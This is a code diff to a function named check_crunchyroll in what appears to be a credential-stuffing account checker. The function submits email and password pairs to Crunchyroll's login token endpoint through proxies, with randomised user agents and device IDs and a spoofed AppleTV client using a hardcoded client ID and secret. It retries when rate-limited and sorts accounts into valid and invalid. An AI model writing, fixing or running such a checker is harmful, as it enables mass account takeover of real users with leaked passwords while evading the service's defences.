@@ -6,7 +6,6 @@ import time
 import string
 import random
 import uuid
-import base64
 import requests
 import re
 import random
@@ -1333,53 +1332,36 @@ def check_crunchyroll(email, password, proxy=None):
     proxies = {'http': proxy, 'https': proxy} if proxy else None
     max_retries = 4
 
-    # === CURRENT WORKING ANDROID CLIENT (2026) ===
-    CLIENT_ID = "y2arvjb0h0rgvtizlovy"
-    CLIENT_SECRET = "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2"
-    basic_auth = base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()
-
     for attempt in range(max_retries):
         try:
             device_id, _, _ = generate_random_device_info()
             user_agent = generate_random_user_agent()
 
             # ====================== LOGIN ======================
-            # token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
-            token_url = "https://www.crunchyroll.com/auth/v1/token"
+            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
             
-            headers = {
-                "authorization": f"Basic {basic_auth}",
-                "content-type": "application/x-www-form-urlencoded",
-                "user-agent": user_agent,
-                "accept": "application/json",
-                "accept-language": "en-US,en;q=0.9",
-                "x-datadog-sampling-priority": "0",
-                "etp-anonymous-id": device_id,
-                "connection": "Keep-Alive",
-                "host": "www.crunchyroll.com"
-            }
-
             token_data = {
                 "grant_type": "password",
                 "username": email,
                 "password": password,
                 "scope": "offline_access",
+                "client_id": "y2arvjb0h0rgvtizlovy",
+                "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
+                "device_type": "AppleTV",
                 "device_id": device_id,
-                "device_type": "Android",
-                "device_name": "sdk_gphone64_x86_64"
+                "device_name": "AppleTV"
             }
 
-            print(f"[DEBUG] Login Attempt {attempt+1} | UA: {user_agent[:70]}...")
+            headers = {
+                "host": "beta-api.crunchyroll.com",
+                "x-datadog-sampling-priority": "0",
+                "etp-anonymous-id": device_id,
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": user_agent,
+                "accept-encoding": "gzip"
+            }
 
-            resp = requests.post(
-                token_url, 
-                data=token_data, 
-                headers=headers, 
-                proxies=proxies, 
-                timeout=25
-            )
-
-            print(f"[DEBUG] Status: {resp.status_code} | Body: {resp.text[:450]}")
+            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
 
             if resp.status_code == 200:
                 access_token = resp.json().get('access_token')
@@ -1388,7 +1370,7 @@ def check_crunchyroll(email, password, proxy=None):
             elif resp.status_code == 401:
                 result['message'] = "Invalid email or password"
                 return result
-            elif resp.status_code in (429, 403):
+            elif resp.status_code == 429:
                 time.sleep(3 + attempt * 2)
                 continue
             else:
